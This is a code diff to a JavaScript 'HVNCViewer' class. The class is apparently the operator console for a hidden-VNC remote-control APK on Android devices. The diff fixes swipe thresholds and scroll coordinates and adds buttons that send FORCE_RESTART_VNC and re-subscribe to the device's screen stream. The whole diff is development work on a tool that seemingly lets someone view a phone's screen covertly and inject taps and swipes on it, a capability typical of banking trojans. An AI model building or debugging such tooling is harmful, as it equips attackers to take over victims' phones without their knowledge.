@@ -6,14 +6,17 @@
  *   WS binary → parse 49B header → Worker createImageBitmap()
  *   → pendingBitmap → rAF ctx.drawImage (desynchronized)
  *
- * NEW in v2:
- *   • Explicit START (▶) + STOP (⏹) buttons
- *   • Mode selector: VNC | V2 | DUPLO
- *   • Full gesture toolbar strip
- *   • V2 mode → START_SCREEN_CAPTURE (MediaProjection-based)
- *   • DUPLO mode → dual stream panel (VNC left, V2 right)
- *   • Touch visible indicator
- *   • FPS + latency overlay
+ * FIXES applied:
+ *   [Bug 4] mouseup swipe threshold: < 14 → < 0.03 (normalized).
+ *           Previous threshold was larger than the max possible hypot (√2≈1.41)
+ *           so SWIPE was never reachable from mouse drag.
+ *   [Bug 4] touchend swipe threshold: same fix applied.
+ *   [Bug 5] wheel scroll y2 offset: ±400 (pixel-scale) → ±0.25 (normalized + clamped).
+ *           Previous value produced coords like -399.5 which the APK rejected.
+ *
+ * ADDITIONS:
+ *   ↺ VNC Restart button — sends FORCE_RESTART_VNC to APK then restarts stream subscription
+ *   🔄 Refresh button — soft restart: stop() + start() without APK-side restart
  */
 
 // ── Inline DecodeWorker ────────────────────────────────────────────────────────
@@ -237,6 +240,21 @@ class HVNCViewer {
 
         <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>
 
+        <!-- Stream controls -->
+        <!-- [ADDED] Restart VNC: tells APK to restart its capture engine, then re-subscribes -->
+        <button id="_hv_restartbtn" style="
+          background:#1a1a2e;border:1px solid #7c4af7;color:#7c4af7;
+          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
+          title="Restart VNC capture on device + re-subscribe stream">↺ VNC Restart</button>
+
+        <!-- [ADDED] Refresh: soft restart of the stream subscription (no APK-side restart) -->
+        <button id="_hv_refreshbtn" style="
+          background:#1a1a2e;border:1px solid #3dba7a;color:#3dba7a;
+          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer"
+          title="Soft refresh: stop + re-subscribe stream">🔄 Refresh</button>
+
+        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>
+
         <!-- Touch visibility toggle -->
         <button id="_hv_touchtoggle" style="
           background:#1a1a2e;border:1px solid #2a2a50;color:#888;
@@ -369,6 +387,31 @@ class HVNCViewer {
     // Hierarchy button
     c.querySelector('#_hv_hierarchybtn').addEventListener('click', () => {
       this._cmd('REQUEST_HIERARCHY', {});
+    });
+
+    // [ADDED] VNC Restart button
+    // Sends FORCE_RESTART_VNC to the APK (restarts capture service on device),
+    // then after 600ms stops and restarts the stream subscription on our side.
+    c.querySelector('#_hv_restartbtn').addEventListener('click', () => {
+      this._cmd('FORCE_RESTART_VNC', {});
+      const wasRunning = this._running;
+      if (wasRunning) this.stop();
+      setTimeout(() => {
+        if (wasRunning) this.start();
+      }, 600);
+    });
+
+    // [ADDED] Refresh button
+    // Soft restart: stop() then start() without disturbing the APK capture engine.
+    // Use this when the stream freezes or subscription drops without device-side issues.
+    c.querySelector('#_hv_refreshbtn').addEventListener('click', () => {
+      const wasRunning = this._running;
+      if (wasRunning) {
+        this.stop();
+        setTimeout(() => this.start(), 300);
+      } else {
+        this.start();
+      }
     });
 
     // Touch visibility toggle
@@ -583,6 +626,15 @@ class HVNCViewer {
   _bindInput() {
     const c = this.canvas;
 
+    // [Bug 4 FIX] SWIPE_THRESHOLD changed from 14 to 0.03 (normalized).
+    // _mapCoords returns values clamped to [0.0, 1.0]. The max possible
+    // Math.hypot(dx, dy) across the full canvas is √2 ≈ 1.414.
+    // The original threshold of 14 is always > 1.414, so the else branch
+    // (SWIPE) was unreachable — every interaction became TAP or LONG_PRESS.
+    // 0.03 = 3% of screen dimension, which correctly distinguishes intentional
+    // drags from tap jitter.
+    const SWIPE_THRESHOLD = 0.03;
+
     c.addEventListener('contextmenu', e => {
       e.preventDefault();
       const pos = this._mapCoords(e.clientX, e.clientY);
@@ -605,7 +657,8 @@ class HVNCViewer {
       const dx  = up.x - this._mouse.origin.x;
       const dy  = up.y - this._mouse.origin.y;
 
-      if (Math.hypot(dx, dy) < 14) {
+      // [Bug 4 FIX] Was: Math.hypot(dx, dy) < 14  (always true, SWIPE unreachable)
+      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
         this._cmd(dur < 500 ? 'TAP' : 'LONG_PRESS',
           { x: this._mouse.origin.x, y: this._mouse.origin.y });
       } else {
@@ -630,11 +683,17 @@ class HVNCViewer {
         if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
         return;
       }
-      const pos   = this._mapCoords(e.clientX, e.clientY);
-      const delta = e.deltaY > 0 ? 400 : -400;
+      const pos = this._mapCoords(e.clientX, e.clientY);
+
+      // [Bug 5 FIX] Was: delta = e.deltaY > 0 ? 400 : -400, then y2: pos.y - delta
+      // pos.y is normalized [0,1]. Subtracting ±400 produced values like -399.5
+      // which the APK auto-detected as pixel-scale, multiplied by screen height,
+      // and got -383,520px — an impossible coordinate that GestureDescription rejected.
+      // Fix: use normalized delta ±0.25 (25% of screen height) clamped to [0.01, 0.99].
+      const delta = e.deltaY > 0 ? 0.25 : -0.25;
       this._cmd('SWIPE', {
         x1: pos.x, y1: pos.y,
-        x2: pos.x, y2: pos.y - delta,
+        x2: pos.x, y2: Math.max(0.01, Math.min(0.99, pos.y - delta)),
         duration: 200,
       });
     }, { passive: false });
@@ -722,9 +781,11 @@ class HVNCViewer {
       const dx  = up.x - this._mouse.origin.x;
       const dy  = up.y - this._mouse.origin.y;
 
-      if (Math.hypot(dx, dy) < 14 && dur < 500) {
+      // [Bug 4 FIX] Same threshold fix applied to touchend handler.
+      // Was: Math.hypot(dx, dy) < 14 — always true, SWIPE unreachable from touch input.
+      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD && dur < 500) {
         this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
-      } else if (Math.hypot(dx, dy) < 14) {
+      } else if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
         this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
       } else {
         this._cmd('SWIPE', {
